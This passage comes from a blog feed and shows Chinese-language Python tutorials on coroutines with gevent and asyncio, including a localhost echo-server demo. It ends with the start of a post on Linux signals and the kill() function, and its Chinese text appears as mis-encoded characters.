class="headerlink" title="åŒæ—¶èµ·å¤šä¸ªåç¨‹"></a>åŒæ—¶èµ·å¤šä¸ªåç¨‹</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g_l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    g = gevent.spawn(eat)</span><br><span class="line">    g_l.append(g)</span><br><span class="line">gevent.joinall(g_l)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨forå¾ªç¯èµ·10ä¸ªåç¨‹ï¼Œå¹¶å°†èµ·çš„æ¯ä¸€ä¸ªåç¨‹å­˜å…¥åˆ—è¡¨ä¸­è¿›è¡Œé˜»å¡ç­‰å¾…ã€‚å¾—åˆ°çš„è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><h5 id="è·å–åç¨‹è¿”å›å€¼"><a href="#è·å–åç¨‹è¿”å›å€¼" class="headerlink" title="è·å–åç¨‹è¿”å›å€¼"></a>è·å–åç¨‹è¿”å›å€¼</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">456</span></span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  <span class="comment"># åˆ›é€ ä¸€ä¸ªåç¨‹ä»»åŠ¡</span></span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line"></span><br><span class="line">gevent.joinall([g1, g2])</span><br><span class="line">print(g1.value)</span><br><span class="line">print(g2.value)</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>g.value</code>å¯ä»¥æ‹¿åˆ°æ¯ä¸€ä¸ªåç¨‹çš„è¿”å›å€¼ã€‚è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure><h5 id="geventå®ç°socketå¹¶å‘"><a href="#geventå®ç°socketå¹¶å‘" class="headerlink" title="geventå®ç°socketå¹¶å‘"></a>geventå®ç°socketå¹¶å‘</h5><p>serverç«¯å®ç°å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chat</span><span class="params">(conn)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = conn.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        conn.send(msg.upper().encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((<span class="string">'127.0.0.1'</span>, <span class="number">9000</span>))</span><br><span class="line">sk.listen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    gevent.spawn(chat, conn)</span><br></pre></td></tr></table></figure><p>clientç«¯å®ç°å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(i)</span>:</span></span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.connect((<span class="string">'127.0.0.1'</span>, <span class="number">9000</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sk.send(<span class="string">'elssm'</span>.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        print(i*<span class="string">'*'</span>,sk.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    Thread(target=client,args=(i,)).start()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå®¢æˆ·ç«¯èµ·500ä¸ªçº¿ç¨‹å»å’ŒæœåŠ¡ç«¯è¿›è¡Œè¿æ¥ï¼Œåœ¨æœåŠ¡ç«¯æ¥æ”¶ä¹‹åï¼Œä½¿ç”¨<code>gevent</code>æ¨¡å—ï¼Œå°†è¿æ¥è¯·æ±‚é€šè¿‡åç¨‹è¿›è¡Œå¤„ç†ã€‚</p><h4 id="asyncioæ¨¡å—"><a href="#asyncioæ¨¡å—" class="headerlink" title="asyncioæ¨¡å—"></a>asyncioæ¨¡å—</h4><p>asyncio æ˜¯ç”¨æ¥ç¼–å†™ <strong>å¹¶å‘</strong> ä»£ç çš„åº“ï¼Œä½¿ç”¨ <strong>async/await</strong> è¯­æ³•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯asyncioæ¨¡å—æ˜¯åœ¨python3.xä¸­å¼•å…¥çš„ï¼Œåœ¨python2.xä¸­å¹¶ä¸æ”¯æŒ</p><h5 id="èµ·ä¸€ä¸ªåç¨‹"><a href="#èµ·ä¸€ä¸ªåç¨‹" class="headerlink" title="èµ·ä¸€ä¸ªåç¨‹"></a>èµ·ä¸€ä¸ªåç¨‹</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(func())</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä½¿ç”¨<code>get_event_loop</code>æ–¹æ³•åˆ›å»ºä¸€ä¸ªäº‹ä»¶å¾ªç¯ï¼Œä¹‹åä½¿ç”¨<code>run_until_complete</code>æ–¹æ³•å°†åç¨‹æ³¨å†Œåˆ°äº‹ä»¶å¾ªç¯ï¼Œåœ¨asyncioæ¨¡å—ä¸­ä½¿ç”¨asyncå…³é”®å­—å®šä¹‰ä¸€ä¸ªåç¨‹ã€‚å¯¹äºä¸€äº›è€—æ—¶çš„æ“ä½œï¼Œä¾‹å¦‚ç½‘ç»œè¯·æ±‚ï¼Œæ–‡ä»¶è¯»å–ç­‰ã€‚æˆ‘ä»¬ä½¿ç”¨asyncio.sleepå‡½æ•°æ¥æ¨¡æ‹ŸIOæ“ä½œã€‚åç¨‹çš„ç›®çš„ä¹Ÿæ˜¯è®©è¿™äº›IOæ“ä½œå¼‚æ­¥åŒ–ã€‚åœ¨ sleepçš„æ—¶å€™ï¼Œä½¿ç”¨awaitè®©å‡ºæ§åˆ¶æƒã€‚å³å½“é‡åˆ°é˜»å¡è°ƒç”¨çš„å‡½æ•°çš„æ—¶å€™ï¼Œä½¿ç”¨awaitæ–¹æ³•å°†åç¨‹çš„æ§åˆ¶æƒè®©å‡ºï¼Œä»¥ä¾¿loopè°ƒç”¨å…¶ä»–çš„åç¨‹ã€‚è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">end ...</span><br></pre></td></tr></table></figure><h5 id="å¯åŠ¨å¤šä¸ªåç¨‹"><a href="#å¯åŠ¨å¤šä¸ªåç¨‹" class="headerlink" title="å¯åŠ¨å¤šä¸ªåç¨‹"></a>å¯åŠ¨å¤šä¸ªåç¨‹</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">wait_obj = asyncio.wait([func(), func(), func()])</span><br><span class="line">loop.run_until_complete(wait_obj)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨<code>get_event_loop</code>æ–¹æ³•å…ˆåˆ›å»ºä¸€ä¸ªäº‹ä»¶å¾ªç¯ï¼Œæ¥ç€æˆ‘ä»¬ä½¿ç”¨<code>asyncio.wait</code>å‡½æ•°å°†å¤šä¸ªåç¨‹ä¿å­˜åœ¨åˆ—è¡¨ä¸­ï¼Œæ¯å½“æœ‰ä»»åŠ¡é˜»å¡çš„æ—¶å€™å°±awaitï¼Œç„¶åå…¶ä»–åç¨‹ç»§ç»­å·¥ä½œã€‚åˆ›å»ºå¤šä¸ªåç¨‹çš„åˆ—è¡¨ï¼Œç„¶åå°†è¿™äº›åç¨‹æ³¨å†Œåˆ°äº‹ä»¶å¾ªç¯ä¸­ã€‚è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br></pre></td></tr></table></figure><h5 id="è·å–å¤šä¸ªåç¨‹è¿”å›å€¼"><a href="#è·å–å¤šä¸ªåç¨‹è¿”å›å€¼" class="headerlink" title="è·å–å¤šä¸ªåç¨‹è¿”å›å€¼"></a>è·å–å¤šä¸ªåç¨‹è¿”å›å€¼</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">t1 = loop.create_task(func())</span><br><span class="line">t2 = loop.create_task(func())</span><br><span class="line">tasks = [t1,t2]</span><br><span class="line">wait_obj = asyncio.wait([t1,t2])</span><br><span class="line">loop.run_until_complete(wait_obj)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tasks:</span><br><span class="line">    print(i.result())</span><br></pre></td></tr></table></figure><p>åœ¨asyncioæ¨¡å—ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>loop</code>è‡ªå¸¦çš„<code>create_task</code>ã€‚é€šè¿‡<code>result()</code>æ–¹æ³•è·å–åˆ°è¿”å›å€¼ã€‚è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br><span class="line">123</span><br><span class="line">123</span><br></pre></td></tr></table></figure><h5 id="æŒ‰é¡ºåºè·å–åç¨‹è¿”å›å€¼"><a href="#æŒ‰é¡ºåºè·å–åç¨‹è¿”å›å€¼" class="headerlink" title="æŒ‰é¡ºåºè·å–åç¨‹è¿”å›å€¼"></a>æŒ‰é¡ºåºè·å–åç¨‹è¿”å›å€¼</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">5</span>-i)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line">    <span class="keyword">return</span> i,<span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    task_l = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        task = asyncio.ensure_future(func(i))</span><br><span class="line">        task_l.append(task)</span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> asyncio.as_completed(task_l):</span><br><span class="line">        res = <span class="keyword">await</span> ret</span><br><span class="line">        print(res)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬èµ·5ä¸ªåç¨‹ï¼Œä½¿ç”¨<code>ensure_future</code>å®‰æ’å°†è¦æ‰§è¡Œçš„åç¨‹ä»»åŠ¡ï¼Œå¹¶å°†5ä¸ªåç¨‹ä¿å­˜åœ¨åˆ—è¡¨ä¸­ï¼Œä½¿ç”¨<code>as_completed</code>æ–¹æ³•å¯ä»¥éšæ—¶è·å–ä»»åŠ¡çš„è¿”å›å€¼ï¼Œä¸éœ€è¦ç­‰å¾…å¾ªç¯äº‹ä»¶ç»“æŸåä¸€å¹¶è·å–æ‰€æœ‰ä»»åŠ¡çš„è¿”å›å€¼ï¼Œéšåä½¿ç”¨<code>await</code>ç­‰å¾…ä»»åŠ¡å®Œæˆã€‚å› ä¸ºæˆ‘ä»¬æ˜¯æŒ‰é¡ºåºæ¥è·å–è¿”å›å€¼ï¼Œå› æ­¤ç¡çœ æ—¶é—´æœ€çŸ­çš„åº”è¯¥æœ€å…ˆè¿”å›ï¼Œå¯¹äº5æ¬¡å¾ªç¯ï¼Œå½“<code>i=4</code>çš„æ—¶å€™åªéœ€è¦ç¡çœ 1ç§’ï¼Œå› æ­¤æˆ‘ä»¬åº”è¯¥å…ˆå¾—åˆ°çš„è¿”å›å€¼æ˜¯<code>(4,123)</code>ï¼Œæœ€ç»ˆå¾—åˆ°çš„è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">(4, 123)</span><br><span class="line">end ...</span><br><span class="line">(3, 123)</span><br><span class="line">end ...</span><br><span class="line">(2, 123)</span><br><span class="line">end ...</span><br><span class="line">(1, 123)</span><br><span class="line">end ...</span><br><span class="line">(0, 123)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;åç¨‹æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#åç¨‹æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;åç¨‹æ¦‚å¿µ&quot;&gt;&lt;/a&gt;åç¨‹æ¦‚å¿µ&lt;/h4&gt;&lt;p&gt;åç¨‹æ˜¯ä¸€ç§ç”¨æˆ·æ€çš„è½»é‡çº§çº¿ç¨‹ï¼Œåç¨‹çš„è°ƒåº¦å®Œå…¨ç”±ç”¨æˆ·æ§åˆ¶ã€‚åç¨‹æ‹¥æœ‰è‡ªå·±çš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆã€‚åç¨‹è°ƒåº¦åˆ‡æ¢æ—¶ï¼Œå°†å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆä¿
      
    
    </summary>
    
    
      <category term="Python" scheme="elssm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linuxç³»ç»Ÿç¼–ç¨‹(ä¸‰)</title>
    <link href="elssm.github.io/2021/10/20/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E4%B8%89/"/>
    <id>elssm.github.io/2021/10/20/Linuxç³»ç»Ÿç¼–ç¨‹-ä¸‰/</id>
    <published>2021-10-20T03:21:41.000Z</published>
    <updated>2021-12-13T09:48:49.808Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ä¿¡å·"><a href="#ä¿¡å·" class="headerlink" title="ä¿¡å·"></a>ä¿¡å·</h4><h5 id="ä¿¡å·æ¦‚å¿µ"><a href="#ä¿¡å·æ¦‚å¿µ" class="headerlink" title="ä¿¡å·æ¦‚å¿µ"></a>ä¿¡å·æ¦‚å¿µ</h5><p>ä¿¡å·æ˜¯ä¿¡æ¯çš„è½½ä½“ï¼ŒLinux/UNIXç¯å¢ƒä¸‹ï¼Œå¤è€ã€ç»å…¸çš„é€šä¿¡æ–¹å¼ï¼Œç°ä¸‹ä¾ç„¶æ˜¯ä¸»è¦çš„é€šä¿¡æ‰‹æ®µã€‚</p><p>Unixæ—©æœŸç‰ˆæœ¬å°±æä¾›äº†ä¿¡å·æœºåˆ¶ï¼Œä½†ä¸å¯é ï¼Œä¿¡å·å¯èƒ½ä¸¢å¤±ï¼ŒBerkeleyå’ŒAT&amp;Téƒ½å¯¹ä¿¡å·æ¨¡å‹åšäº†æ›´æ”¹ï¼Œå¢åŠ äº†å¯é ä¿¡å·æœºåˆ¶ï¼Œä½†å½¼æ­¤ä¸å…¼å®¹ã€‚POSIX.1å¯¹å¯é ä¿¡å·ä¾‹ç¨‹è¿›è¡Œäº†æ ‡å‡†åŒ–ã€‚</p><ul><li>æœªå†³ï¼šäº§ç”Ÿä¸é€’è¾¾ä¹‹é—´çŠ¶æ€</li><li>é€’è¾¾ï¼šäº§ç”Ÿå¹¶ä¸”é€è¾¾åˆ°è¿›ç¨‹ï¼Œç›´æ¥è¢«å†…æ ¸å¤„ç†æ‰</li><li>ä¿¡å·å¤„ç†æ–¹å¼ï¼šæ‰§è¡Œé»˜è®¤å¤„ç†åŠ¨ä½œã€å¿½ç•¥ã€æ•æ‰</li><li>é˜»å¡ä¿¡å·é›†(ä¿¡å·å±è”½å­—)ï¼šæœ¬è´¨æ˜¯ä½å›¾ï¼Œç”¨æ¥è®°å½•ä¿¡å·çš„å±è”½çŠ¶æ€ï¼Œä¸€æ—¦è¢«å±è”½çš„ä¿¡å·ï¼Œåœ¨è§£é™¤å±è”½å‰ï¼Œä¸€ç›´å¤„äºæœªå†³çŠ¶æ€</li><li>æœªå†³ä¿¡å·é›†ï¼šæœ¬è´¨ä¹Ÿæ˜¯ä½å›¾ï¼Œç”¨æ¥è®°å½•ä¿¡å·çš„å¤„ç†çŠ¶æ€ï¼Œè¯¥ä¿¡å·é›†ä¸­çš„ä¿¡å·ï¼Œè¡¨ç¤ºå·²ç»äº§ç”Ÿï¼Œä½†å°šæœªè¢«å¤„ç†ã€‚</li></ul><h5 id="ä¿¡å·ç‰¹è´¨"><a href="#ä¿¡å·ç‰¹è´¨" class="headerlink" title="ä¿¡å·ç‰¹è´¨"></a>ä¿¡å·ç‰¹è´¨</h5><p>ç”±äºä¿¡å·æ˜¯é€šè¿‡è½¯ä»¶æ–¹æ³•å®ç°ï¼Œå…¶å®ç°æ‰‹æ®µå¯¼è‡´ä¿¡å·æœ‰å¾ˆå¼ºçš„å»¶æ—¶æ€§ï¼Œä½†å¯¹äºç”¨æˆ·æ¥è¯´ï¼Œè¿™ä¸ªå»¶è¿Ÿæ—¶é—´éå¸¸çŸ­ï¼Œä¸æ˜“å¯Ÿè§‰ã€‚<strong>æ¯ä¸ªè¿›ç¨‹æ”¶åˆ°çš„æ‰€æœ‰ä¿¡å·ï¼Œéƒ½æ˜¯ç”±å†…æ ¸è´Ÿè´£å‘é€çš„ï¼Œå†…æ ¸å¤„ç†ã€‚</strong></p><h5 id="äº§ç”Ÿä¿¡å·"><a href="#äº§ç”Ÿä¿¡å·" class="headerlink" title="äº§ç”Ÿä¿¡å·"></a>äº§ç”Ÿä¿¡å·</h5><ul><li>æŒ‰é”®äº§ç”Ÿï¼š<code>Ctrl+c</code>ã€<code>Ctrl+z</code>ã€<code>Ctrl+\</code></li><li><p>ç³»ç»Ÿè°ƒç”¨äº§ç”Ÿï¼š<code>killã€raiseã€abort</code></p></li><li><p>è½¯ä»¶æ¡ä»¶äº§ç”Ÿï¼šå®šæ—¶å™¨<code>alarm</code></p></li><li>ç¡¬ä»¶å¼‚å¸¸äº§ç”Ÿï¼šéæ³•è®¿é—®å†…å­˜ã€é™¤0ã€å†…å­˜å¯¹é½é”™è¯¯</li><li>å‘½ä»¤äº§ç”Ÿï¼š<code>kill</code>å‘½ä»¤</li></ul><h5 id="ä¿¡å·4è¦ç´ "><a href="#ä¿¡å·4è¦ç´ " class="headerlink" title="ä¿¡å·4è¦ç´ "></a>ä¿¡å·4è¦ç´ </h5><p>å’Œå˜é‡ä¸‰è¦ç´ ç±»ä¼¼ï¼Œæ¯ä¸ªä¿¡å·ä¹Ÿæœ‰å…¶å¿…å¤‡å››è¦ç´ ï¼Œåˆ†åˆ«æ˜¯ç¼–å·ã€åç§°ã€äº‹ä»¶å’Œé»˜è®¤å¤„ç†åŠ¨ä½œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/20/Linuxç³»ç»Ÿç¼–ç¨‹-ä¸‰/1.png" alt="1"></p><h5 id="killå‡½æ•°"><a href="#killå‡½æ•°" class="headerlink" title="killå‡½æ•°"></a>killå‡½æ•°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">æˆåŠŸï¼š0</span><br><span class="line">å¤±è´¥ï¼š<span class="number">-1</span> è®¾ç½®errno</span><br><span class="line"></span><br><span class="line">pid&gt;<span class="number">0</span> : å‘é€ä¿¡å·ç»™æŒ‡å®šçš„è¿›ç¨‹</span><br><span class="line">pid=<span class="number">0</span> : å‘é€ä¿¡å·ç»™ä¸è°ƒç”¨killå‡½æ•°è¿›ç¨‹å±äºåŒä¸€è¿›ç¨‹ç»„çš„æ‰€æœ‰è¿›ç¨‹</span><br><span class="line">pid&lt;<span class="number">-1</span> : å–|pid|å‘ç»™å¯¹åº”è¿›ç¨‹ç»„</span><br><span class="line">pid=<span class="number">-1</span> : å‘é€ç»™è¿›ç¨‹æœ‰æƒé™å‘é€çš„ç³»ç»Ÿä¸­çš„æ‰€æœ‰è¿›ç¨‹</span><br></pre></td></tr></table></figure><h5 id="é€šè¿‡å­è¿›ç¨‹å‘ä¿¡å·çš„æ–¹å¼killè¿›ç¨‹"><a href="#é€šè¿‡å­è¿›ç¨‹å‘ä¿¡å·çš„æ–¹å¼killè¿›ç¨‹" class="headerlink" title="é€šè¿‡å­è¿›ç¨‹å‘ä¿¡å·çš„æ–¹å¼killè¿›ç¨‹"></a>é€šè¿‡å­è¿›ç¨‹å‘ä¿¡å·çš„æ–¹å¼killè¿›ç¨‹</h5><figure class="highlight c"><table><tr><td 